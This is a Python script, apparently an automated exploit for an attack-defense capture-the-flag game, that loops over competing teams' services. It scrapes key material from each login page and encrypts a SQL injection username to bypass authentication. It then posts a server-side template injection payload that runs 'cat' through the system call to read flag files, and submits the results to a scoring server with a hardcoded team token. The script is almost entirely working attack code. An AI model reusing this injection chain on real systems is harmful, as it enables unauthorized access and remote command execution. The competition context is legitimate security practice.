import requests
import sys
import json
import os
import time
from bs4 import BeautifulSoup
import re
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode


def getKey(TEAM_SECRET, SALT):
    keys = PBKDF2(TEAM_SECRET, SALT, 32, count=100, hmac_hash_module=SHA256)
    return keys

def encrypt(input, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv.encode())
    aaaa = cipher.encrypt(pad(input.encode(), 16))
    return b64encode(aaaa)


while 1:
    for i in range(1,21):
        if i == 6: continue
        try:
            team_id = str(i).rjust(2, '0')
            url = f'http://10.254.0.254:4{team_id}1'

            r = requests.get(url + '/index.php?page=login')

            ALL = r.text.split("';")

            SECRET = ALL[0].split("'")[1]
            SALT = ALL[1].split("'")[1]
            IV = ALL[2].split("'")[1]
            # print(SECRET)
            # print(SALT)
            # print(IV)

            key = getKey(SECRET, SALT)
            enc_username = encrypt("nake'-- -", key, IV).decode()
            enc_password = encrypt("1", key, IV).decode()

            s = requests.Session()
            aaaa = s.post(url + '/index.php?page=login', data={'username': enc_username, 'password': enc_password})
            r = s.post(url + '/index.php?page=user', data={'preview': 1, 'name': "{{['cat /f*']|map('system')|join}}"})

            flag = r.text.splitlines()[-1].split('=')[0] + '='
            print(flag)

            arr = [flag]
            TIMEOUT = 5
            r = requests.put('http://10.254.0.253:8080/flags',
                                headers={'X-Team-Token': 'ffbc6c754fb95409', 'Accept-Encoding': 'gzip, deflate', 'Accept': 'Connection: close', 'Content-Length': '36', },
                                json=[flag for flag in arr], timeout=TIMEOUT)

            print(r.content)
            time.sleep(1)
        except:
            pass